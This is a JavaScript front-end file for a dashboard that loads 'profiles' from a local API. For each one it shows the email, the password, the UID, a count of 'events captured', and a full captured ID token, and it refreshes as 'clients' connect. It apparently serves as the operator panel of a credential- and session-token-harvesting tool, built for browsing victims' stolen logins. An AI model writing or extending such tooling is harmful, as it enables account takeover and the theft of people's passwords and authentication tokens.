let profiles = [];
let selectedEmail = null;

function formatValue(value) {
    if (value === undefined || value === null || value === '') {
        return 'N/A';
    }
    return escapeHtml(String(value));
}

function renderProfileDetails(profile) {
    const userDetails = document.getElementById('userDetails');
    if (!userDetails) return;

    if (!profile) {
        userDetails.innerHTML = `
            <div class="welcome-message">
                <p>Select a user from the left panel.</p>
                <p>Profile details will appear here.</p>
            </div>
        `;
        return;
    }

    userDetails.innerHTML = `
        <div class="profile-grid">
            <div class="profile-item full-width">
                <span class="profile-label">Email</span>
                <div class="profile-value">${formatValue(profile.email)}</div>
            </div>
            <div class="profile-item">
                <span class="profile-label">Display Name</span>
                <div class="profile-value">${formatValue(profile.display_name)}</div>
            </div>
            <div class="profile-item">
                <span class="profile-label">Password</span>
                <div class="profile-value">${formatValue(profile.password || profile.label)}</div>
            </div>
            <div class="profile-item full-width">
                <span class="profile-label">UID</span>
                <div class="profile-value">${formatValue(profile.uid)}</div>
            </div>
            <div class="profile-item">
                <span class="profile-label">Events Captured</span>
                <div class="profile-value">${formatValue(profile.event_count)}</div>
            </div>
            <div class="profile-item">
                <span class="profile-label">ID Token Captured</span>
                <div class="profile-value">${profile.has_id_token ? 'Yes' : 'No'}</div>
            </div>
            <div class="profile-item full-width">
                <span class="profile-label">ID Token</span>
                <div class="profile-value token">${formatValue(profile.id_token)}</div>
            </div>
            <div class="profile-item">
                <span class="profile-label">Last Payload Timestamp</span>
                <div class="profile-value">${formatValue(profile.last_payload_timestamp)}</div>
            </div>
            <div class="profile-item">
                <span class="profile-label">Last Received At</span>
                <div class="profile-value">${formatValue(profile.last_received_at)}</div>
            </div>
        </div>
    `;
}

function renderProfiles() {
    const usersList = document.getElementById('usersList');
    const userCount = document.getElementById('userCount');

    if (!usersList || !userCount) return;

    userCount.textContent = String(profiles.length);

    if (profiles.length === 0) {
        usersList.innerHTML = '<p class="empty-message">No profiles found</p>';
        renderProfileDetails(null);
        return;
    }

    usersList.innerHTML = '';

    profiles.forEach((profile) => {
        const card = document.createElement('div');
        card.className = `user-card${profile.email === selectedEmail ? ' selected' : ''}`;
        card.innerHTML = `
            <div class="user-card-email">${formatValue(profile.email)}</div>
            <div class="user-card-meta">
                <span>Events: ${formatValue(profile.event_count)}</span>
                <span>${profile.has_id_token ? 'Token: Yes' : 'Token: No'}</span>
            </div>
        `;

        card.addEventListener('click', () => {
            selectedEmail = profile.email;
            renderProfiles();
            renderProfileDetails(profile);
        });

        usersList.appendChild(card);
    });

    const selectedProfile = profiles.find((profile) => profile.email === selectedEmail);
    if (selectedProfile) {
        renderProfileDetails(selectedProfile);
        return;
    }

    selectedEmail = profiles[0].email;
    const firstCard = usersList.querySelector('.user-card');
    if (firstCard) {
        firstCard.classList.add('selected');
    }
    renderProfileDetails(profiles[0]);
}

async function loadProfiles() {
    try {
        const response = await fetch('/api/profiles');
        const data = await response.json();
        profiles = Array.isArray(data.profiles) ? data.profiles : [];
        renderProfiles();
    } catch (error) {
        console.error('Error loading profiles:', error);
    }
}

// Keep profile page updated when client activity changes.
window.onClientConnected = () => loadProfiles();
window.onClientDisconnected = () => loadProfiles();
window.onClientInfoUpdated = () => loadProfiles();
window.onClientsLoaded = () => loadProfiles();

window.onPageLoad = () => {
    loadProfiles();
};
